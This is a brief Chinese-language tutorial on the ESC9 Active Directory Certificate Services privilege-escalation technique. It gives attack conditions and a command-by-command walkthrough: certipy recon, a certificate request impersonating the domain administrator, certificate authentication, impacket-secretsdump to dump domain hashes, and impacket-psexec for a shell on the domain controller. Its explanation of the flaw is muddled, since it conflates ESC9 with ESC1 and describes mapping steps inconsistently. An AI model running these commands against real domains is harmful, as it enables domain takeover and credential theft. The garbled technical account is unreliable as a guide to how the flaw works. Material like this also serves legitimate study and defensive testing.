# ESC9

## 介绍

ESC9主要针对模板的弱证书映射配置，导致低权用户可以通过伪造证书属性来冒充高权限用户（如域管理员），实现权限提升。

## 原理

### 核心漏洞：

证书模板缺少msPKI-Certificate-Name-Flag中的CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT或NO_SECURITY_EXTENSION，允许Enrollee（申请者）在证书请求中自定义Subject Alternative Name（SAN）中的objectSID或其他标识符。

### 攻击条件：

（1）证书模板启用Client Authentication EKU（Extended Key Usage）

（2）模板有NO_SECURITY_EXTENSION标志（缺少SID安全扩展）

（3）当前低权限有Enroll权限（常见于Domain Users）

（4）无强SID验证，导致证书可以映射到任意用户（如Domain Admin）

### 攻击效果：

（1）申请者修改证书的altSecurityIdentities或SID，认证时Kerberos/NTLM会映射到目标高权限用户，实现冒充登录或DCSync等操作

### 与其他ESC对比：

（1）ESC1：模板允许任意SAN

（2）ESC8：NTLM Relay到ADCS Web Enrollment

（3）ESC9：弱SID映射，无需Relay，更隐蔽。

## 利用步骤

### 1）侦擦模板（Recon）

```
certipy find -u 'lowuser@domain.local' -p 'pass' -dc-ip 10.10.10.100
```

### 2）修改用户属性

（1）用低权限账户修改自己的 altSecurityIdentities 属性为目标用户（e.g., Domain Admin 的 email 或 UPN）。

（2）或直接注入SID

### 3）请求证书（Exploit）

（1）用Certpy请求证书

```
certipy req -u 'lowuser@domain.local' -p 'pass' -ca 'DOMAIN-CA' -template 'VulnerableTemplate' -upn 'administrator@domain.local' -dc-ip DC_IP
```

-upn 或 -sid 指定冒充目标。

获取.pfx证书文件

### 4）认证冒充（Authentication）

（1）用证书进行Kerberos认证

```
certipy auth -pfx admin.pfx -dc-ip DC_IP
```

（2）然后用getTGT或impacket获取NTLM哈希，进行DCSync

```
impacket-secretsdump -k -no-pass DOMAIN/administrator@DC_HOST
```

### 5）权限提升（Privilege Escalation）

```
impacket-psexec -k -no-pass DOMAIN/administrator@DC_IP cmd.exe
```